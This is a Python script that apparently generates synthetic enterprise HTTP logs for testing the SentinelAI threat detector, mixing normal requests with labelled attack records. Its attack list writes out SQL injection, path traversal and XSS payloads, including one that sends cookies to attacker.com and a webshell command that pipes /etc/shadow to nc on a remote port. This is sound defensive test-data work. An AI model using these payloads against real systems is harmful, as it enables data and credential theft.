#!/usr/bin/env python3
"""
SentinelAI Sample Log Generator
Simulates realistic enterprise HTTP traffic mixing normal user traffic and diverse
cyber attack vectors (SQLi, XSS, Path Traversal, Scanners, Brute Force, High Entropy).
Can save to file (JSON or Apache format) or stream directly to SentinelAI via REST / WebSocket.
"""

import os
import sys
import time
import json
import random
import argparse
from datetime import datetime, timedelta, timezone
from typing import List, Dict, Any

try:
    import requests
except ImportError:
    requests = None

# Sample pools for normal traffic
NORMAL_PATHS = [
    "/",
    "/home",
    "/about",
    "/services",
    "/products",
    "/products?category=electronics&sort=price_asc",
    "/products?id=1024&ref=promo",
    "/api/v1/user/profile",
    "/api/v1/catalog/items?page=1&limit=20",
    "/checkout/cart",
    "/contact",
    "/static/css/theme.min.css",
    "/static/js/app.bundle.js",
    "/static/images/logo.png",
    "/static/fonts/inter.woff2",
    "/blog/cybersecurity-best-practices",
    "/dashboard/overview",
    "/settings/notifications"
]

NORMAL_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36"
]

NORMAL_IPS = [
    "198.51.100.14", "198.51.100.22", "203.0.113.45", "203.0.113.88",
    "192.0.2.10", "192.0.2.45", "192.0.2.77", "198.51.100.105",
    "203.0.113.150", "192.0.2.204"
]

# Attack pools
ATTACK_VECTORS = [
    {
        "category": "SQL Injection",
        "path": "/products?id=1'%20UNION%20SELECT%20username,password%20FROM%20users--",
        "method": "GET",
        "status": 500,
        "bytes": 2840,
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "ip": "185.220.101.5"  # Tor exit simulation
    },
    {
        "category": "SQL Injection",
        "path": "/api/v1/auth/login",
        "method": "POST",
        "payload": "user=admin' OR '1'='1'--&pass=secret",
        "status": 401,
        "bytes": 450,
        "ua": "sqlmap/1.6.12#stable (https://sqlmap.org)",
        "ip": "103.251.167.22"
    },
    {
        "category": "Cross-Site Scripting (XSS)",
        "path": "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
        "method": "GET",
        "status": 200,
        "bytes": 4120,
        "ua": "Mozilla/5.0 (X11; Linux x86_64)",
        "ip": "45.154.255.89"
    },
    {
        "category": "Cross-Site Scripting (XSS)",
        "path": "/comments/post?msg=%3Cimg%20src=x%20onerror=fetch('//attacker.com/steal?c='+document.cookie)%3E",
        "method": "POST",
        "status": 400,
        "bytes": 520,
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "ip": "194.26.29.112"
    },
    {
        "category": "Path Traversal",
        "path": "/api/v1/download?file=../../../../../../etc/passwd",
        "method": "GET",
        "status": 403,
        "bytes": 312,
        "ua": "curl/8.4.0",
        "ip": "91.240.118.172"
    },
    {
        "category": "Path Traversal",
        "path": "/view_image?src=%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini",
        "method": "GET",
        "status": 404,
        "bytes": 240,
        "ua": "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
        "ip": "185.196.220.14"
    },
    {
        "category": "Automated Security Scanner",
        "path": "/wp-login.php",
        "method": "GET",
        "status": 404,
        "bytes": 180,
        "ua": "Nikto/2.1.6",
        "ip": "193.142.146.33"
    },
    {
        "category": "Automated Security Scanner",
        "path": "/.env",
        "method": "GET",
        "status": 404,
        "bytes": 160,
        "ua": "gobuster/3.1.0",
        "ip": "193.142.146.33"
    },
    {
        "category": "Command Injection / Webshell",
        "path": "/uploads/shell.php?cmd=cat%20/etc/shadow%20|%20nc%20198.51.100.99%204444",
        "method": "GET",
        "status": 500,
        "bytes": 3890,
        "ua": "python-requests/2.31.0",
        "ip": "194.135.31.25"
    },
    {
        "category": "Credential Stuffing / Brute Force",
        "path": "/api/v1/auth/login",
        "method": "POST",
        "payload": "username=administrator&password=Password123!",
        "status": 401,
        "bytes": 412,
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "ip": "185.244.25.190"
    },
    {
        "category": "High Entropy Obfuscated Payload",
        "path": "/gateway/exec?token=VmpGR1UxTXlTa2hWYW14V1lsVmFjRlpyV21GV01WcHpVbTVPYVUxV1VqTldNbEpZWkVaT2FWSXphRkJXYWtZd1ZqSkZlR0ZZVWt0V01WSXpXa2RzTkZaRldsaGFSMFp1Vmtad1dsWkVRVGs9",
        "method": "POST",
        "status": 400,
        "bytes": 780,
        "ua": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
        "ip": "45.154.255.89"
    }
]


def generate_single_log(is_attack: bool, base_time: datetime) -> Dict[str, Any]:
    """Generate a single realistic HTTP log entry."""
    if is_attack:
        template = random.choice(ATTACK_VECTORS)
        return {
            "timestamp": base_time.isoformat(),
            "client_ip": template["ip"],
            "method": template["method"],
            "path": template["path"],
            "status_code": template["status"],
            "response_bytes": template["bytes"],
            "user_agent": template["ua"],
            "referer": "https://google.com/search" if random.random() > 0.5 else "-",
            "payload": template.get("payload", ""),
            "simulated_threat": True,
            "simulated_category": template["category"]
        }
    else:
        path = random.choice(NORMAL_PATHS)
        ip = random.choice(NORMAL_IPS)
        ua = random.choice(NORMAL_USER_AGENTS)
        method = "POST" if ("/cart" in path or "/login" in path) and random.random() > 0.6 else "GET"
        status_code = random.choices([200, 201, 301, 304, 404], weights=[85, 5, 4, 4, 2])[0]
        resp_bytes = random.randint(240, 15000) if status_code == 200 else random.randint(120, 500)

        return {
            "timestamp": base_time.isoformat(),
            "client_ip": ip,
            "method": method,
            "path": path,
            "status_code": status_code,
            "response_bytes": resp_bytes,
            "user_agent": ua,
            "referer": "https://sentinelai.internal/" if random.random() > 0.4 else "-",
            "payload": "",
            "simulated_threat": False,
            "simulated_category": "Normal"
        }


def format_apache_clf(log_dict: Dict[str, Any]) -> str:
    """Format dictionary as Apache/Nginx Combined Log Format string."""
    dt = datetime.fromisoformat(log_dict["timestamp"])
    ts_str = dt.strftime("%d/%b/%Y:%H:%M:%S +0000")
    return (
        f'{log_dict["client_ip"]} - - [{ts_str}] '
        f'"{log_dict["method"]} {log_dict["path"]} HTTP/1.1" '
        f'{log_dict["status_code"]} {log_dict["response_bytes"]} '
        f'"{log_dict["referer"]}" "{log_dict["user_agent"]}"'
    )


def generate_logs(count: int, anomaly_ratio: float = 0.12) -> List[Dict[str, Any]]:
    """Generate ordered sequence of logs over time."""
    now = datetime.now(timezone.utc)
    start_time = now - timedelta(hours=6)
    delta_step = (now - start_time) / count

    logs = []
    current_time = start_time

    for _ in range(count):
        is_attack = random.random() < anomaly_ratio
        log_entry = generate_single_log(is_attack, current_time)
        logs.append(log_entry)
        current_time += delta_step + timedelta(milliseconds=random.randint(5, 50))

    return logs


def main():
    parser = argparse.ArgumentParser(description="SentinelAI Synthetic HTTP Log Generator")
    parser.add_argument("--count", type=int, default=1500, help="Number of logs to generate (default: 1500)")
    parser.add_argument("--anomaly-ratio", type=float, default=0.12, help="Proportion of attack logs (0.0 - 1.0)")
    parser.add_argument("--output", type=str, default="data/sample_logs.json", help="Output file path")
    parser.add_argument("--format", choices=["json", "apache"], default="json", help="Log output format")
    parser.add_argument("--stream-url", type=str, default=None, help="If provided, streams logs via REST to URL")
    parser.add_argument("--delay", type=float, default=0.05, help="Delay between streamed logs in seconds")
    args = parser.parse_args()

    print(f"Generating {args.count} logs (Anomaly Ratio: {args.anomaly_ratio * 100:.1f}%)...")
    logs = generate_logs(args.count, args.anomaly_ratio)

    if args.stream_url:
        if not requests:
            print("Error: 'requests' package required for streaming.")
            sys.exit(1)
        print(f"Streaming {len(logs)} logs to {args.stream_url} with {args.delay}s delay...")
        for idx, entry in enumerate(logs):
            try:
                res = requests.post(args.stream_url, json=entry, timeout=2.0)
                if idx % 50 == 0 or idx == len(logs) - 1:
                    print(f"  [{idx + 1}/{len(logs)}] Status: {res.status_code}")
                time.sleep(args.delay)
            except Exception as e:
                print(f"  Streaming error on #{idx}: {e}")
                time.sleep(1.0)
        print("Streaming complete.")
        return

    # Save to file
    os.makedirs(os.path.dirname(args.output), exist_ok=True)
    if args.format == "apache":
        with open(args.output, "w") as f:
            for l in logs:
                f.write(format_apache_clf(l) + "\n")
        print(f"Successfully saved {len(logs)} Apache CLF logs to {args.output}")
    else:
        with open(args.output, "w") as f:
            json.dump(logs, f, indent=2)
        print(f"Successfully saved {len(logs)} JSON logs to {args.output}")


if __name__ == "__main__":
    main()
